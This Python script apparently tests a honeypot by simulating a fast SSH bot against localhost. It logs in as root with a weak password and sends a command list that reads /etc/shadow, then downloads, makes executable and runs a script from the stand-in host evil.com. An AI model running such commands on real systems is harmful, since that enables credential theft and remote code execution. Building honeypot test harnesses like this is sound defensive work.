import paramiko
import time

def run_bot_attack():
    print("=== CHAMELEON TIER 1 BOT SIMULATOR ===")
    print("This script simulates an automated credential-stuffing or exploit bot.")
    print("It connects and fires commands as fast as the network allows (0ms delay).")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print("\nConnecting to honeypot...")
        client.connect('127.0.0.1', port=2222, username='root', password='password123')
        
        # We don't even use an interactive shell, bots typically use exec_command or rapid shell writes
        channel = client.invoke_shell()
        
        commands = [
            "whoami",
            "cat /etc/shadow",
            "uname -a",
            "wget http://evil.com/malware.sh",
            "chmod +x malware.sh",
            "./malware.sh"
        ]
        
        print("Connected! Firing malicious payload sequence...")
        
        for cmd in commands:
            channel.send(cmd + "\n")
            # We purposely do not sleep. Bots don't sleep.
            
        # Give it half a second to ensure all data traverses the localhost socket
        time.sleep(0.5)
        
        print("\nBot execution complete. Disconnecting.")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    run_bot_attack()
